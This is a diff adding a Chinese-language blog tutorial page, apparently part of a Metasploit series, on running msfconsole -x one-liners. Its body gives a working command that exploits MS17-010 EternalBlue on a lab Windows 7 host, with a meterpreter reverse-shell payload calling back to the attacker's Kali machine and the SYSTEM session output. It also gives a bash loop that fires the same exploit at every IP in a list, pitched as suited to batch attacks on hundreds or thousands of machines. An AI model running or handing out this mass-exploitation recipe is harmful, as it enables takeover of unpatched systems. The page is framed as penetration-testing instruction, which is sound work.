@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<!--Copyright©QingSword.COM︻☼1010D>-->
+<!--Copyright©X.QingSword.COM︻☼1010D>-->
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,python,计算机技术博客,渗透测试,kali渗透测试,kali,kali web渗透,kali主机渗透,kali无线渗透,metasploit,白帽子测试">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,node.js,javascript,python,计算机技术博客">
+	<meta name="author" content="x.qingsword.com">
+	<title>[Metasploit]-10-使用msfconsole代替msf控制台语句 - X.QingSword.COM</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!-- 代码块高亮js -->
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shThemeRDark.css"/>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shCore.js"></script>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shBrushBash.js"></script>
+	<script type="text/javascript">
+	SyntaxHighlighter.all();
+	</script>
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container"> 
+				<!-- 根大纲-->
+				<a href="http://x.qingsword.com" title="晴刃">
+					<h1 class="nav-logo">晴刃</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					He lies somewhere here
+				</h2>
+				<nav class="nav-links"> 
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1> 
+					<ul>
+						<li  class="active li-hidden">
+							<a href="../index.html" title="home">
+								<span class="link-word"><img src="../logo/home.png" alt="home" class="link-img">首页</span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../pt.html" title="pt">
+								<span class="link-word"><img src="../logo/linux.png" alt="pt" class="link-img">渗透<span class="word-hidden">技术</span></span>
+							</a>
+						</li>
+						<li >
+							<a href="../sitemap.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">文章</span>归档</span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>		
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Metasploit]-10-使用msfconsole代替msf控制台语句</h1>	
+				</header><!-- /header -->
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>在前面的文章中，我们完成一次渗透操作，需要在msf控制台中中输入多条语句，这样的方式在对单台机器实现渗透时比较常用，如果是同时对几百台几万台机器发起批量渗透测试，那么那种方式就会很费时费力，本文介绍了一种新的方法，使用msfconsole一句话代替msf控制台多条语句的执行，在批量渗透中十分好用。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#msfconsole-1">0×1.使用msfconsole代替msf控制台语句</a></li>
+						 <li><a href="#msfconsole-2">0×2.Shell调用msfconsole实现批量渗透</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					
+					<h2 id="msfconsole-1">0×1.使用msfconsole代替msf控制台语句</h2>
+
+					<p>msfconsole是Metasploit程序集中的一个小程序，为了方便我们使用其他程序调用，在msfconsole命令参数中，能够直接填入目标IP、本地IP端口、使用哪个Payload、使用哪个Exploit；这样的设计能够让其他程序方便的替换其中的字段；例如，写一个循环程序，去迭代一个IP地址池中的几百个地址，将这个地址作为变量，传递给msfconsole命令中的rhost参数，实现批量扫描，下面仅演示msfconsole的参数使用。</p>
+					<p>实验环境介绍：</p>
+					<p class="indent-p">
+						三台机器处于同一个网段（192.168.80/24）； <br>
+						攻击主机Kali：192.168.80.158 ；<br>
+						靶机2008：192.168.80.139 ；<br>
+						靶机win7：192.168.80.140 ；
+					</p>
+					<p>在Kali上执行下面的命令，调用Win7的MS17-010漏洞：</p>
+					<pre class="brush: bash;">
+					#直接在shell中执行msfconsole命令
+					# -x参数后面输入需要调用的命令，引号中的内容用分号隔开每一条命令，这些命令就是我们在msf控制台中输入的一条条配置指令，本例use了"exploit/windows/smb/ms17_010_eternalblue"这个exploit，set的payload为"windows/x64/meterpreter/reverse_tcp"，set了远程IP为Win7的IP地址，本地IP为Kali的IP与Kali上想要开放用于连接Win7的端口，最后"run -j"，执行前面所有的语句，并且，让结果在后台返回（即不占用当前控制台，作为session连接保存在后台）
+					root@qingsword.com:~# msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/meterpreter/reverse_tcp;set RHOST 192.168.80.140;set LHOST 192.168.80.158;set LPORT 9876;run -j"
+
+					#当看到WIN的时候，表示漏洞利用成功，用sessions -i查看保存在后台的连接
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i
+					1   meterpreter x64/windows  NT AUTHORITY\SYSTEM @ QING-PC  192.168.80.158:9876 -&gt; 192.168.80.140:49323 (192.168.80.140)
+
+					#想要切换到这个连接，可以使用session+会话ID
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions 1
+					[*] Starting interaction with 1...
+
+					meterpreter &gt; 
+
+					#可以使用background将这个会话放入后台保持连接
+					meterpreter &gt; background 
+					[*] Backgrounding session 1...
+					</pre>		
+
+					<h2 id="msfconsole-2">0×2.Shell调用msfconsole实现批量渗透</h2>
+					
+					<p>这一部分沿用第一部分的实验环境，使用一个小shell脚本，来实现逐行读取一个文本中的IP地址（每行一个IP地址），将这个IP地址代入RHOST变量中，实现批量脚本渗透测试，请看下面的实例演示：</p>
+					<pre class="brush: bash;">
+					#在Kali上，生成一个ip.txt文件，放在当前用户家目录中，内容如下，包含Win7和Win2008的IP地址
+					root@qingsword.com:~# echo 192.168.80.139 &gt; ip.txt
+					root@qingsword.com:~# echo 192.168.80.140 &gt;&gt; ip.txt
+					root@qingsword.com:~# more ip.txt 
+					192.168.80.139
+					192.168.80.140
+
+					#创建一个sh脚本
+					root@qingsword.com:~# vim pp.sh
+					#脚本内容如下
+					root@qingsword.com:~# more pp.sh 
+					#!/bin/bash
+					#使用line参数去循环读取刚才创建的ip.txt文件中的内容，然后通过gnome-terminal命令打开新的bash窗口，执行msfconsole命令，msfconsole命令中的RHOST参数值使用line读取到的IP地址，端口号从9876递增
+					i=9876
+					for line in $(cat ip.txt)
+					do
+						gnome-terminal -- bash -c "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/meterpreter/reverse_tcp;set RHOST $line;set LHOST 192.168.80.158;set LPORT $((i++));run -j'"
+					done
+
+					#执行这个脚本就会自动打开两个bash窗口（ip.txt中有几个IP就会打开几个bash窗口），然后执行msfconsole命令，自动利用MS17-010命令渗透对应IP
+
+					#执行之后，就会看到打开两个bash，并且每个窗口针对一个IP地址执行渗透命令
+					root@qingsword.com:~# bash pp.sh
+					</pre>
+
+					<p>本文配套小视频：[<a title="qingsword制作kali利用shell批量渗透小视频" href="https://pan.baidu.com/s/1Hpxck-EfPCgoL0RcDIhg1A" target="_blank" rel="nofollow">点击这里</a>]下载观看，提取码[nng2]</p>
+					<!-- /正文 -->
+
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="晴刃-自由、互助、分享、专注计算机技术。" href="http://x.qingsword.com" target="_blank">晴刃(X.QingSword.COM)</a>
+					</p>
+					<p>*原文连接:<a title="[Metasploit]-10-使用msfconsole代替msf控制台语句" href="https://x.qingsword.com/qing/Metasploit-10.html" target="_blank">https://x.qingsword.com/qing/Metasploit-10.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			QingSword.COM &nbsp;<img src="../logo/by-nc-sa.png" alt="Creative Commons" title="Creative Commons">
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
